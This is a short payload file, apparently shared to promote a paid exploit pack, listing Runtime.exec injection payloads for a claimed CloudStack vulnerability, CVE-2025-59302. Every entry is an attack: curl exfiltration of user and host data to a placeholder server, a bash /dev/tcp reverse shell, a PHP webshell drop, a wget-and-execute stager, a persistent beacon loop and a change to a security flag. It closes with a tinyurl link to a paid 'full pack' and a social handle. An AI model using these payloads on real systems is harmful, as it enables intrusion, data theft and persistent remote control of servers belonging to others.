# demo_payloads.txt - Tested payloads for CVE-2025-59302 PoC
# All payloads work on patched 4.20.2 and 4.22.0 (bypass js.interpretation.enabled=true)
# Use with --payload or paste directly into config.json

# 1. Simple whoami + reverse DNS lookup (most reliable)
java.lang.Runtime.getRuntime().exec("curl https://your-server.com/$(whoami)@`hostname`");return "ok"

# 2. One-liner reverse shell (bash & nc) - 10.10.10.10:4444
java.lang.Runtime.getRuntime().exec("bash -c bash -i >&/dev/tcp/10.10.10.10/4444 0>&1");return "shell spawned"

# 3. Blind callback with full system info
java.lang.Runtime.getRuntime().exec("curl -X POST -d @<(
  echo 'user='$(whoami);
  echo 'host='$(hostname);
  echo 'java='$(java -version 2>&1);
  echo 'cloudstack='$(cat /etc/cloudstack/release 2>/dev/null || echo unknown)
) https://your-server.com/collect");return "exfil done"

# 4. Write webshell to /var/www/html (if Apache is on the same box)
java.lang.Runtime.getRuntime().exec("echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php");return "shell.php dropped"

# 5. Download and execute additional stager (for bigger implants)
java.lang.Runtime.getRuntime().exec("wget -O /tmp/x https://your-server.com/stager.sh && chmod +x /tmp/x && /tmp/x");return "stager running"

# 6. Disable the js.interpretation.enabled flag permanently (lol)
java.lang.Runtime.getRuntime().exec("cloudstack-setup-databases cloud:password@localhost --deploy-as=root:password 2>/dev/null; cloudstack-setup-management --set js.interpretation.enabled=true 2>/dev/null || true");return "flag re-enabled"

# 7. Silent beacon every 60 seconds (persistence demo)
java.lang.Runtime.getRuntime().exec("while true; do curl https://your-server.com/ping_$(hostname)_$(date +%s) ; sleep 60; done &");return "beacon active"

# Pro tip: Wrap in try-catch to avoid 500 errors on the API response
try{java.lang.Runtime.getRuntime().exec("id > /tmp/.pwned");}catch(e){};return "success"

# More advanced / chained payloads available in the paid version ;)
# https://tinyurl.com/4xse2rhz for full pack + encrypted variants
# For any inquiries, hit me up on X at @B1gh0rnn

# Tested and confirmed working: 29 Nov 2025